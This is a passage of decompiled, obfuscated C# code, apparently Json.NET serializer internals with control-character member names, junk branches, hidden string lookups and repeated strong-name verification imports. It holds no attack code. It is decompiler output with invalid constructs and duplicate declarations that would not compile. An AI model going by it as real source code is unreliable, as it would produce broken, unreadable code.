        if (\u0014.\u0006.\u0001(obj1, obj0.\u0001, \u0014.\u0006.\u0001(obj0), out result))
        {
          if (true)
          {
            \u0014.\u0006.\u0001(obj0, JsonToken.Date, (object) result, false);
            return new DateTimeOffset?(result);
          }
        }
        else
        {
          if (DateTimeOffset.TryParse(obj1, (IFormatProvider) \u0014.\u0006.\u0001(obj0), DateTimeStyles.RoundtripKind, out result))
          {
            \u0014.\u0006.\u0001(obj0, JsonToken.Date, (object) result, false);
            return new DateTimeOffset?(result);
          }
          \u0014.\u0006.\u0001(obj0, JsonToken.String, (object) obj1, false);
          throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21546), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj1));
        }
      }
      return new DateTimeOffset?();
    }

    static bool \u0001([In] System.Type obj0)
    {
      \u000F.\u0003 obj;
      while (true)
      {
        int num = (int) \u0014.\u0006.\u0001(obj0);
        if (true)
          goto label_7;
label_1:
        if (true)
        {
          if (obj == \u000F.\u0003.\u0001)
            break;
          goto label_9;
        }
        else
          continue;
label_7:
        obj = (\u000F.\u0003) num;
        goto label_1;
      }
      if (true)
        return false;
label_9:
      int num1 = obj == \u000F.\u0003.\u0002 ? 1 : 0;
      if (false)
        return num1 != 0;
      return num1 == 0;
    }

    static object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0005.\u0005 obj1,
      [In] \u0012.\u0007 obj2,
      [In] System.Type obj3,
      [In] object obj4)
    {
      if (obj0.\u0001 != null && obj0.\u0001.\u0001() >= TraceLevel.Info)
        goto label_4;
label_2:
      object obj = obj1.\u0001(obj2, obj3, obj4, (\u0016.\u0003) \u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001 == null || obj0.\u0001.\u0001() < TraceLevel.Info)
        return obj;
      obj0.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(obj2 as \u000F.\u0001, obj2.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21672), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3, (object) \u0001\u0002.\u007E\u0017\u0004((object) obj1))), (Exception) null);
      return obj;
label_4:
      obj0.\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001(obj2 as \u000F.\u0001, obj2.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21611), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3, (object) \u0001\u0002.\u007E\u0017\u0004((object) obj1))), (Exception) null);
      goto label_2;
    }

    static bool \u0001(
      [In] JsonProperty obj0,
      [In] object obj1,
      [In] \u0001.\u0007 obj2,
      [In] JsonProperty obj3,
      [In] JsonWriter obj4,
      [In] \u0006.\u0002 obj5,
      [In] \u0010.\u0006 obj6)
    {
      bool? nullable = \u0014.\u0006.\u0001(obj6, (\u0016.\u0007) obj2, obj3, obj5, obj0);
      int num1 = nullable.HasValue ? 1 : 0;
      int num2;
      while (true)
      {
        bool flag1 = (num1 != 0 ? nullable.GetValueOrDefault() : \u0014.\u0006.\u0001(\u0012.\u0003.\u0003, ((\u0016.\u0008) obj6).\u0001.\u0001, obj6)) && (obj3 == null || obj3.\u0003());
        bool flag2 = \u0014.\u0006.\u0001(obj6, \u0006.\u0001.\u0003, (\u0016.\u0007) obj2, obj3, obj5, obj0);
        num2 = flag1 | flag2 ? 1 : 0;
        if (num2 != 0)
        {
          obj4.\u0002();
          if (flag1)
            \u0014.\u0006.\u0001(obj6, obj4, ((\u0016.\u0007) obj2).\u0002(), obj1);
          if (flag2)
          {
            if (false)
              num1 = num2;
            else
              break;
          }
          else
            goto label_9;
        }
        else
          goto label_10;
      }
      \u0014.\u0006.\u0001(\u0001\u0002.\u007E\u0017\u0004(obj1), obj4, obj6);
label_9:
      obj4.\u0001(\u0014.\u0006.\u0082(9827), false);
label_10:
      if (((\u0006.\u0002) obj2).\u0001 != null)
        return num2 != 0;
      \u0001.\u0007 obj7 = obj2;
      \u0015.\u0010 obj8 = ((\u0016.\u0008) obj6).\u0001.\u0001;
      System.Type type = obj2.\u0001();
      if ((object) type == null)
      {
        // ISSUE: type reference
        type = \u0004\u0002.\u0084\u0004(__typeref (object));
      }
      \u0016.\u0007 obj9 = obj8.\u0001(type);
      \u0014.\u0006.\u0001((\u0006.\u0002) obj7, obj9);
      return num2 != 0;
    }

    static unsafe bool \u0001(ref TimeSpan _param0, int _param1, [Out] \u0015.\u0008 _param2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (_param2[_param1] == '-');
      if (\u0014.\u0006.\u0001(_param2.\u0001(), _param1 + 1, 2, out *(int*) voidPtr) == \u0011.\u0007.\u0002)
      {
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        // ISSUE: cast to a reference type
        if (_param2.\u0002() - _param1 > 5 && \u0014.\u0006.\u0001(_param2.\u0001(), _param1 + 3, 2, (int&) ((IntPtr) voidPtr + 4)) != \u0011.\u0007.\u0002)
        {
          _param0 = new TimeSpan();
          return false;
        }
        _param0 = \u0007\u0005.\u0002\u000E(\u0006\u0005.\u009F\u0008((double) *(int*) voidPtr), \u0006\u0005.\u0001\u000E((double) *(int*) ((IntPtr) voidPtr + 4)));
        if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
          _param0 = _param0.Negate();
        return true;
      }
      _param0 = new TimeSpan();
      return false;
    }

    static void \u0001([In] \u0005.\u0004 obj0)
    {
      if (obj0.\u0001 != null)
        return;
      obj0.\u0001 = \u0014.\u0006.\u0001(obj0.\u0001, 35);
    }

    static bool? \u0001(
      [In] \u0010.\u0006 obj0,
      [In] \u0016.\u0007 obj1,
      [In] JsonProperty obj2,
      [In] \u0006.\u0002 obj3,
      [In] JsonProperty obj4)
    {
      bool? nullable = new bool?();
      if (obj2 != null)
        goto label_7;
label_1:
      if (!nullable.HasValue && obj4 != null)
        goto label_8;
label_2:
      if (!nullable.HasValue && obj3 != null)
        nullable = obj3.\u0001();
      if (!nullable.HasValue)
        nullable = obj1.\u0002();
      return nullable;
label_8:
      nullable = obj4.\u0002();
      goto label_2;
label_7:
      nullable = obj2.\u0001();
      goto label_1;
    }

    static void \u0001([In] JsonWriter obj0)
    {
label_0:
      if (!obj0.\u0001.\u0001)
        goto label_3;
label_1:
      if (true)
        ++obj0.\u0001.\u0001;
      else
        goto label_0;
label_3:
      if (false)
        goto label_1;
    }

    static void \u0001()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0014.\u0006.\u0001);
      }
      catch
      {
      }
    }

    static bool \u0001(System.Type _param0, System.Type _param1, out System.Type _param2)
    {
      \u0014.\u0006.\u0001((object) _param0, \u0014.\u0006.\u0082(4722));
      System.Type type1 = _param1;
      string str = \u0014.\u0006.\u0082(21737);
      if (true)
        \u0014.\u0006.\u0001((object) type1, str);
      if (!\u0015.\u000E.\u0002(_param1) || !\u0015.\u000E.\u0004(_param1))
        throw new ArgumentNullException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21774), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param1));
      if (\u0015.\u000E.\u0002(_param0) && \u0015.\u000E.\u0003(_param0))
      {
        System.Type type2 = \u0001\u0002.\u007E\u001E\u0004((object) _param0);
        if ((object) _param1 == (object) type2)
        {
          _param2 = _param0;
          return true;
        }
      }
      foreach (System.Type type3 in \u008F\u0002.\u007E\u0008\u0006((object) _param0))
      {
        if (\u0015.\u000E.\u0003(type3))
        {
          System.Type type4 = \u0001\u0002.\u007E\u001E\u0004((object) type3);
          if ((object) _param1 == (object) type4)
          {
            _param2 = type3;
            return true;
          }
        }
      }
      _param2 = (System.Type) null;
      return false;
    }

    static unsafe object \u0001([In] IList obj0, [In] int[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      IList list = obj0;
      *(int*) voidPtr = 0;
      while (true)
      {
        if (*(int*) voidPtr < obj1.Length)
          goto label_11;
        else
          goto label_9;
label_7:
        *(int*) voidPtr = *(int*) voidPtr + 1;
        continue;
label_9:
        if (false)
          goto label_7;
        else
          goto label_10;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = obj1[*(int*) voidPtr];
        int num1 = *(int*) voidPtr;
        int num2 = obj1.Length;
        int num3;
        while (true)
        {
          num3 = num2 - 1;
          if (false)
            num2 = num3;
          else
            break;
        }
        if (num1 != num3)
        {
          if (true)
          {
            list = (IList) \u007F\u0002.\u007E\u0090\u0005((object) list, *(int*) ((IntPtr) voidPtr + 4));
            goto label_7;
          }
          else
            goto label_7;
        }
        else
          break;
      }
      return \u007F\u0002.\u007E\u0090\u0005((object) list, *(int*) ((IntPtr) voidPtr + 4));
label_10:
      return (object) list;
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] \u0013.\u000F.\u0003 obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj2.\u0001;
        num1 = obj0;
        num2 = obj2.\u0002;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = obj0;
            continue;
label_16:
            obj0 = obj2.\u0002;
            goto label_4;
label_17:
            *(int*) voidPtr = obj2.\u0001 - obj2.\u0002 + obj0 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj0 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj2.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj3, obj1, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = obj1;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      obj1 = num1 + num2;
      obj0 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj2.\u0001, *(int*) voidPtr - obj0, (Array) obj3, obj1, obj0);
      obj2.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj2.\u0002;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] string obj0, [In] \u0011.\u0003 obj1)
    {
      if (\u0014.\u0006.\u0001(obj1, \u001F.\u007E\u0011\u0003((object) obj0) - 1, true))
      {
        do
        {
          for (int index = 0; index < \u001F.\u007E\u0011\u0003((object) obj0); ++index)
          {
            if ((int) obj1.\u0001[obj1.\u0002 + index] != (int) \u001B\u0002.\u007E\u0088\u0005((object) obj0, index))
            {
              if (true)
              {
                obj1.\u0002 += index;
                return false;
              }
              goto label_9;
            }
          }
        }
        while (false);
        obj1.\u0002 += \u001F.\u007E\u0011\u0003((object) obj0);
        return true;
      }
label_9:
      obj1.\u0002 = obj1.\u0001;
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj1);
    }

    static void \u0001([In] \u001B obj0, [In] Regex obj1, [In] \u0007.\u0004 obj2)
    {
      string str1 = (string) null;
      if (\u0014.\u0006.\u0001(obj2, \u0083\u0003.\u007E\u0015\u0007((object) obj1), RegexOptions.IgnoreCase))
        str1 = global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(21835));
      if (\u0014.\u0006.\u0001(obj2, \u0083\u0003.\u007E\u0015\u0007((object) obj1), RegexOptions.Multiline))
        str1 = global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(21840));
      if (\u0014.\u0006.\u0001(obj2, \u0083\u0003.\u007E\u0015\u0007((object) obj1), RegexOptions.Singleline))
        str1 = global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(17469));
      string str2 = global::\u0006.\u009B(str1, \u0014.\u0006.\u0082(21845));
      if (\u0014.\u0006.\u0001(obj2, \u0083\u0003.\u007E\u0015\u0007((object) obj1), RegexOptions.ExplicitCapture))
        str2 = global::\u0006.\u009B(str2, \u0014.\u0006.\u0082(21850));
      \u0014.\u0006.\u0001(obj0, global::\u0001.\u007E\u0001((object) obj1), str2);
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] \u0004.\u0001 obj1)
    {
      if (obj1 >= \u0004.\u0001.\u0001)
      {
        while (obj1 <= \u0004.\u0001.\u0004)
        {
          do
          {
            obj0.\u0001 = obj1;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static string \u0001([In] object obj0)
    {
      if (obj0 != null)
        goto label_5;
label_1:
      return \u0014.\u0006.\u0082(17140);
label_5:
      if (obj0 is string)
        return global::\u000F.\u0005\u0002((object) \u0014.\u0006.\u0082(17149), obj0, (object) \u0014.\u0006.\u0082(17149));
      if (true)
        return global::\u0001.\u007E\u0001(obj0);
      goto label_1;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0016.\u0001 obj0, [In] \u0016.\u0003 obj1)
    {
      if (!\u000E.\u0008.\u0001<\u0005.\u0005>((ICollection<\u0005.\u0005>) obj0.\u0001()))
      {
        if (true)
          goto label_62;
label_3:
        int index;
        for (; index < obj0.\u0001().Count; ++index)
          obj1.\u0001().Insert(index, obj0.\u0001()[index]);
        goto label_4;
label_62:
        index = 0;
        goto label_3;
      }
label_4:
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001(\u0014.\u0006.\u0001(obj0));
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001());
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001());
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001()());
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001());
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001());
      if (obj0.\u0001() != null)
        obj1.\u0001(obj0.\u0001());
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0002)
        obj1.\u0001 = obj0.\u0001;
      else
        goto label_51;
label_50:
      obj1.\u0002 = obj0.\u0002;
label_51:
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0001.HasValue)
      {
        if (true)
          obj1.\u0001 = obj0.\u0001;
        else
          goto label_50;
      }
      if (obj0.\u0001.HasValue)
        obj1.\u0001 = obj0.\u0001;
      if (obj0.\u0002 != null)
        obj1.\u0001 = obj0.\u0002;
      if (!obj0.\u0001)
        return;
      obj1.\u0001 = obj0.\u0001;
      obj1.\u0001 = obj0.\u0001;
    }

    static JTokenType \u0001([In] JTokenType? obj0)
    {
      int num;
      for (int index = obj0.HasValue ? 1 : 0; index == 0; index = num)
      {
        num = 8;
        if (num != 0)
          return (JTokenType) num;
      }
      do
      {
        JTokenType valueOrDefault = obj0.GetValueOrDefault();
        if (valueOrDefault == JTokenType.Comment || valueOrDefault == JTokenType.String || valueOrDefault == JTokenType.Raw)
          return obj0.GetValueOrDefault();
      }
      while (false);
      return JTokenType.String;
    }

    static unsafe string \u0001([In] string obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(6);
      StringBuilder stringBuilder1 = new StringBuilder();
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
      *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 0;
      *(int*) voidPtr = 0;
      while (true)
      {
        while (true)
        {
          if (*(int*) voidPtr >= \u001F.\u007E\u0011\u0003((object) obj0))
            return global::\u0001.\u007E\u0001((object) stringBuilder1);
          char ch = \u001B\u0002.\u007E\u0088\u0005((object) obj0, *(int*) voidPtr);
          if (ch != ',')
          {
            if (ch == '[')
            {
              if (true)
              {
                *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
                *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 0;
                StringBuilder stringBuilder2 = \u0095.\u007E\u009D\u0003((object) stringBuilder1, ch);
                goto label_16;
              }
              else
                goto label_8;
            }
          }
          else
            goto label_9;
label_3:
          if (ch != ']')
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 5) == (sbyte) 0)
            {
              if (true)
              {
                StringBuilder stringBuilder3 = \u0095.\u007E\u009D\u0003((object) stringBuilder1, ch);
                goto label_16;
              }
              else
                continue;
            }
            else
              goto label_16;
          }
          else
          {
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
            *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 0;
          }
label_8:
          StringBuilder stringBuilder4 = \u0095.\u007E\u009D\u0003((object) stringBuilder1, ch);
          goto label_16;
label_9:
          if (true)
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
            {
              if (true)
              {
                *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
                StringBuilder stringBuilder5 = \u0095.\u007E\u009D\u0003((object) stringBuilder1, ch);
                goto label_16;
              }
              else
                goto label_3;
            }
            else
              break;
          }
          else
            goto label_16;
        }
        *(sbyte*) ((IntPtr) voidPtr + 5) = (sbyte) 1;
label_16:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
    }

    static \u0011.\u0005 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0011.\u0005? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0011.\u0005) num;
      return num == 0 ? \u0011.\u0005.\u0001 : nullable.GetValueOrDefault();
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] object obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
    }

    static void \u0001([In] ILGenerator obj0, [In] \u0007.\u0001 obj1, [In] System.Type obj2)
    {
      while (true)
      {
        if (\u0015.\u000E.\u000E(obj2))
        {
          if (true)
          {
            LocalBuilder localBuilder = \u0016\u0002.\u007E\u0082\u0005((object) obj0, obj2);
            \u0010\u0002.\u007E\u0091\u0004((object) obj0, OpCodes.Ldloc_0);
            break;
          }
        }
        else
        {
          ConstructorInfo constructorInfo;
          do
          {
            constructorInfo = \u0094\u0002.\u007E\u0016\u0006((object) obj2, BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, (Binder) null, ReflectionUtils.\u0001, (ParameterModifier[]) null);
          }
          while (false);
          if ((object) constructorInfo == null)
            throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21855), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2));
          \u0013\u0002.\u007E\u0094\u0004((object) obj0, OpCodes.Newobj, constructorInfo);
          goto label_8;
        }
      }
      \u0018\u0002.\u007E\u0084\u0005((object) obj0, OpCodes.Box, obj2);
label_8:
      \u0003.\u0003.\u0001(obj0);
    }

    static \u0016.\u0007 \u0001([In] \u0006.\u0002 obj0) => obj0.\u0001;

    static long \u0001([In] long obj0) => (obj0 - \u0004.\u0007.\u0001) / 10000L;

    static \u0015.\u0013 \u0001([In] \u0008.\u0010 obj0) => obj0.\u0001 != null ? (\u0015.\u0013) obj0.\u0001 : (\u0015.\u0013) obj0.\u0001;

    static System.Type \u0001([In] System.Type obj0) => JsonTypeReflector.\u0001.\u0001(obj0);

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      int num1 = obj0.\u0002;
      char ch1;
      while (true)
      {
        do
        {
          int num2 = (int) obj0.\u0001[obj0.\u0002];
          char ch2;
          if (true)
            ch2 = (char) num2;
          if (ch2 == char.MinValue)
          {
            if (obj0.\u0001 != obj0.\u0002)
              goto label_3;
          }
          else
            goto label_4;
        }
        while (\u0014.\u0006.\u0001(true, obj0) != 0);
        break;
label_4:
        ch1 = obj0.\u0001[obj0.\u0002];
        if (\u0014.\u0006.\u0001(obj0, ch1))
          ++obj0.\u0002;
        else
          goto label_6;
      }
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0014.\u0006.\u0082(21904));
label_3:
      obj0.\u0001 = new \u0015.\u0008(obj0.\u0001, num1, obj0.\u0002 - num1);
      return;
label_6:
      if (!\u009A.\u0005\u0004(ch1) && ch1 != ':')
        throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(21977), (IFormatProvider) \u0098.\u0002\u0004(), (object) ch1));
      obj0.\u0001 = new \u0015.\u0008(obj0.\u0001, num1, obj0.\u0002 - num1);
    }

    static DateTime? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new DateTime?();
      if (false)
        goto label_7;
      else
        goto label_14;
label_3:
      int num = 1;
      \u0006.\u0005 obj;
      if (num != 0 && num != 0)
        num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0008, (\u0015.\u0013) obj) ? 1 : 0;
      if (num != 0)
        goto label_7;
label_6:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16712), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
label_7:
      if (obj.\u0001 is DateTimeOffset)
      {
        DateTimeOffset dateTimeOffset = (DateTimeOffset) obj.\u0001;
        if (true)
          return new DateTime?(dateTimeOffset.DateTime);
        goto label_3;
      }
      else
      {
        if (obj.\u0001 != null)
          return new DateTime?(Convert.ToDateTime(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
        DateTime? nullable = new DateTime?();
        if (true)
          return nullable;
        goto label_6;
      }
label_14:
      obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null)
        goto label_6;
      else
        goto label_3;
    }

    static string \u0001([In] JsonWriter obj0) => obj0.\u0001;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] JsonWriter obj0, [In] \u0001.\u0003 obj1)
    {
label_0:
      do
      {
        if (true)
          goto label_5;
label_4:
        continue;
label_5:
        if (obj1 < \u0001.\u0003.\u0001 || obj1 > \u0001.\u0003.\u0003)
          throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
        do
        {
          if (true)
            obj0.\u0001 = obj1;
          else
            goto label_0;
        }
        while (false);
        obj0.\u0004();
        goto label_4;
      }
      while (false);
    }

    static object \u0001([In] \u0012.\u0007 obj0, [In] \u0007.\u0004 obj1)
    {
      \u0097\u0002 obj = \u0097\u0002.\u007E\u001C\u0006;
      string str1 = (string) obj0.\u0001();
      int num1 = str1.LastIndexOf('/');
      string pattern = str1.Substring(1, num1 - 1);
      int num2 = num1 + 1;
      string str2 = obj((object) str1, num2);
      RegexOptions options = RegexOptions.None;
      string str3 = str2;
      int num3 = 0;
      while (true)
      {
        int num4 = num3;
        int num5;
        while (true)
        {
          int num6 = num4;
          if (true)
            goto label_23;
label_11:
          if (num6 == 109)
            options |= RegexOptions.Multiline;
label_21:
          ++num4;
          continue;
label_23:
          int num7 = \u001F.\u007E\u0011\u0003((object) str3);
          if (num6 < num7)
          {
            num5 = (int) \u001B\u0002.\u007E\u0088\u0005((object) str3, num4);
            if (true)
            {
              char ch = (char) num5;
              int num8 = (int) ch;
              if (true)
              {
                int num9;
                int num10;
                int num11;
                if ((uint) num8 <= 109U)
                {
                  if (true)
                  {
                    int num12 = (int) ch;
                    if (true)
                    {
                      num11 = 105;
                      num10 = num12;
                    }
                    else
                    {
                      num9 = num12;
                      goto label_13;
                    }
                  }
                  else
                    goto label_21;
                }
                else
                  goto label_12;
label_9:
                if (num10 != num11)
                {
                  num6 = (int) ch;
                  goto label_11;
                }
                else
                {
                  num8 = (int) (options | RegexOptions.IgnoreCase);
                  goto label_17;
                }
label_12:
                num9 = (int) ch;
label_13:
                if (num9 != 115)
                {
                  num10 = (int) ch;
                  num11 = 120;
                  if (num11 != 0)
                  {
                    if (num10 == num11)
                    {
                      options |= RegexOptions.ExplicitCapture;
                      goto label_21;
                    }
                    else
                      goto label_21;
                  }
                  else
                    goto label_9;
                }
                else
                {
                  options |= RegexOptions.Singleline;
                  goto label_21;
                }
              }
label_17:
              options = (RegexOptions) num8;
              goto label_21;
            }
            else
              break;
          }
          else
            goto label_24;
        }
        num3 = num5;
      }
label_24:
      return (object) new Regex(pattern, options);
    }

    static \u0013.\u0006 \u0001([In] \u0012.\u0007 obj0, [In] \u000F.\u0007 obj1)
    {
      if (obj0.\u0001() != JsonToken.None)
        goto label_8;
      else
        goto label_6;
label_3:
      if (obj0.\u0001() != JsonToken.StartArray)
        throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(22103), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
      \u0013.\u0006 obj = new \u0013.\u0006();
      \u0014.\u0006.\u0001((\u0015.\u0013) obj, obj0 as \u000F.\u0001, obj1);
      \u0014.\u0006.\u0001((\u0004.\u0011) obj, obj0, obj1);
      return obj;
label_6:
      int num1 = obj0.\u0001() ? 1 : 0;
      int num2;
      if (true)
      {
        if (num1 == 0)
          throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(22050));
      }
      else
      {
        num2 = num1;
        goto label_3;
      }
label_8:
      num2 = \u0014.\u0006.\u0001(obj0) ? 1 : 0;
      goto label_3;
    }

    static ICollection<string> \u0001([In] \u0015.\u0012 obj0)
    {
      \u0014.\u0006.\u0001(obj0);
      return (ICollection<string>) obj0.\u0001.Keys;
    }

    static bool \u0001(object _param0, System.Type _param1, out string _param2)
    {
      TypeConverter typeConverter = \u0014.\u0006.\u0001(_param1);
      // ISSUE: type reference
      // ISSUE: type reference
      if (typeConverter != null && !(typeConverter is ComponentConverter) && (object) \u0001\u0002.\u007E\u0017\u0004((object) typeConverter) != (object) \u0004\u0002.\u0084\u0004(__typeref (TypeConverter)) && \u0093\u0002.\u007E\u0014\u0006((object) typeConverter, \u0004\u0002.\u0084\u0004(__typeref (string))))
      {
        _param2 = \u0008\u0005.\u007E\u0003\u000E((object) typeConverter, _param0);
        return true;
      }
      if ((object) (_param0 as System.Type) != null)
      {
        _param2 = global::\u0001.\u007E\u0013((object) (System.Type) _param0);
        return true;
      }
      _param2 = (string) null;
      return false;
    }

    static string \u0001([In] \u0001.\u0006 obj0) => global::\u0001.\u007E\u0001((object) obj0.\u0001);

    static bool \u0001([In] System.Type obj0, [In] System.Type obj1)
    {
label_0:
      while (true)
      {
        int num;
        for (int index = \u0015.\u000E.\u0003(obj0) ? 1 : 0; index != 0; index = num)
        {
          if (true)
          {
            if (true)
            {
              num = (object) \u0001\u0002.\u007E\u001E\u0004((object) obj0) == (object) obj1 ? 1 : 0;
              if (true)
                return num != 0;
            }
            else
